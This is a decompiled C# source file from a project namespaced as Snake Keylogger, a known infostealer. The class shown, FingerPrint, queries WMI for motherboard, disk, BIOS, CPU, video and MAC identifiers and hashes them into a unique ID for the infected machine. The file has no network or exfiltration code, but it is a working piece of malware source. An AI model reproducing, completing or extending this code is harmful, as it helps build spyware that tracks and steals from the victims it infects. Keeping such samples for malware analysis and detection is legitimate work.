using System;
using System.Management;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace Snake_Keylogger.snakesystem
{
	// Token: 0x02000010 RID: 16
	public class FingerPrint
	{
		// Token: 0x0600007F RID: 127 RVA: 0x000059C8 File Offset: 0x00003BC8
		public static string Value()
		{
			bool flag = string.IsNullOrEmpty(FingerPrint.fingerPrint2);
			if (flag)
			{
				FingerPrint.fingerPrintDebug = "M>" + FingerPrint.baseId() + "D>>" + FingerPrint.diskId();
				FingerPrint.fingerPrint2 = FingerPrint.GetHash(FingerPrint.fingerPrintDebug);
			}
			return FingerPrint.fingerPrint2;
		}

		// Token: 0x06000080 RID: 128 RVA: 0x00005A28 File Offset: 0x00003C28
		public static string GetHash(string s)
		{
			return FingerPrint.GetHexString(FingerPrint.GetMD5(s));
		}

		// Token: 0x06000081 RID: 129 RVA: 0x00005A48 File Offset: 0x00003C48
		public static string GetMD5(string s)
		{
			checked
			{
				string text;
				using (MD5 md = MD5.Create())
				{
					byte[] array = md.ComputeHash(Encoding.UTF8.GetBytes(s));
					StringBuilder stringBuilder = new StringBuilder();
					int num = array.Length - 1;
					for (int i = 0; i <= num; i++)
					{
						stringBuilder.Append(array[i].ToString("X2").ToLower());
					}
					text = stringBuilder.ToString();
				}
				return text;
			}
		}

		// Token: 0x06000082 RID: 130 RVA: 0x00005AE8 File Offset: 0x00003CE8
		private static string GetHexString(string bt)
		{
			string text = string.Empty;
			checked
			{
				int num = bt.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					text += Conversions.ToString(bt[i]);
					bool flag = (i % 4 == 3) & (i != bt.Length - 1);
					if (flag)
					{
						text += "-";
					}
				}
				return text.ToUpper();
			}
		}

		// Token: 0x06000083 RID: 131 RVA: 0x00005B68 File Offset: 0x00003D68
		private static string identifier(string wmiClass, string wmiProperty, string wmiMustBeTrue)
		{
			string text = "";
			ManagementClass managementClass = new ManagementClass(wmiClass);
			ManagementObjectCollection instances = managementClass.GetInstances();
            try
            {
                foreach (ManagementBaseObject managementBaseObject in instances)
                {
                    ManagementObject managementObject = (ManagementObject)managementBaseObject;
                    if (managementObject[wmiMustBeTrue].ToString() == "True" && text == "")
                    {
                        try
                        {
                            text = managementObject[wmiProperty].ToString();
                            break;
                        }
                        catch { }
                    }
                }
            }
            catch { }
			return text;
		}

		// Token: 0x06000084 RID: 132 RVA: 0x00005C70 File Offset: 0x00003E70
		private static string identifier(string wmiClass, string wmiProperty)
		{
			string text = "";
			ManagementClass managementClass = new ManagementClass(wmiClass);
			ManagementObjectCollection instances = managementClass.GetInstances();
            try
            {
                foreach (ManagementBaseObject managementBaseObject in instances)
                {
                    ManagementObject managementObject = (ManagementObject)managementBaseObject;
                    bool flag = Operators.CompareString(text, "", false) == 0;
                    if (flag)
                    {
                        try
                        {
                            if (wmiClass == "Win32_DiskDrive")
                            {
                                if (Operators.ConditionalCompareObjectEqual(managementObject["InterfaceType"], "USB", false)) { continue; }
                            }
                            text = managementObject[wmiProperty].ToString();
                            break;
                        }
                        catch { }
                    }
                }
            }
            catch { }
			return text;
		}

		// Token: 0x06000085 RID: 133 RVA: 0x00005D94 File Offset: 0x00003F94
		private static string cpuId()
		{
			string text = FingerPrint.identifier("Win32_Processor", "UniqueId");
			if (text == "")
			{
				text = FingerPrint.identifier("Win32_Processor", "ProcessorId");
				if (text == "")
				{
					text = FingerPrint.identifier("Win32_Processor", "Name");
					if (text == "")
					{
						text = FingerPrint.identifier("Win32_Processor", "Manufacturer");
					}
					text += FingerPrint.identifier("Win32_Processor", "MaxClockSpeed");
				}
			}
			return text;
		}

		// Token: 0x06000086 RID: 134 RVA: 0x00005E64 File Offset: 0x00004064
		private static string biosId()
		{
			return string.Concat(new string[]
			{
				FingerPrint.identifier("Win32_BIOS", "Manufacturer"),
				FingerPrint.identifier("Win32_BIOS", "SMBIOSBIOSVersion"),
				FingerPrint.identifier("Win32_BIOS", "IdentificationCode"),
				FingerPrint.identifier("Win32_BIOS", "SerialNumber"),
				FingerPrint.identifier("Win32_BIOS", "ReleaseDate"),
				FingerPrint.identifier("Win32_BIOS", "Version")
			});
		}

		// Token: 0x06000087 RID: 135 RVA: 0x00005F08 File Offset: 0x00004108
		private static string diskId()
		{
			return FingerPrint.identifier("Win32_DiskDrive", "Model") + FingerPrint.identifier("Win32_DiskDrive", "Manufacturer") + FingerPrint.identifier("Win32_DiskDrive", "Signature") + FingerPrint.identifier("Win32_DiskDrive", "TotalHeads");
		}

		// Token: 0x06000088 RID: 136 RVA: 0x00005F70 File Offset: 0x00004170
		private static string baseId()
		{
			return FingerPrint.identifier("Win32_BaseBoard", "Model") + FingerPrint.identifier("Win32_BaseBoard", "Manufacturer") + FingerPrint.identifier("Win32_BaseBoard", "Name") + FingerPrint.identifier("Win32_BaseBoard", "SerialNumber");
		}

		// Token: 0x06000089 RID: 137 RVA: 0x00005FD8 File Offset: 0x000041D8
		private static string videoId()
		{
			return FingerPrint.identifier("Win32_VideoController", "DriverVersion") + FingerPrint.identifier("Win32_VideoController", "Name");
		}

		// Token: 0x0600008A RID: 138 RVA: 0x00006018 File Offset: 0x00004218
		private static string macId()
		{
			return FingerPrint.identifier("Win32_NetworkAdapterConfiguration", "MACAddress", "IPEnabled");
		}

		// Token: 0x04000030 RID: 48
		private static string fingerPrint2 = string.Empty;

		// Token: 0x04000031 RID: 49
		public static string fingerPrintDebug = string.Empty;
	}
}
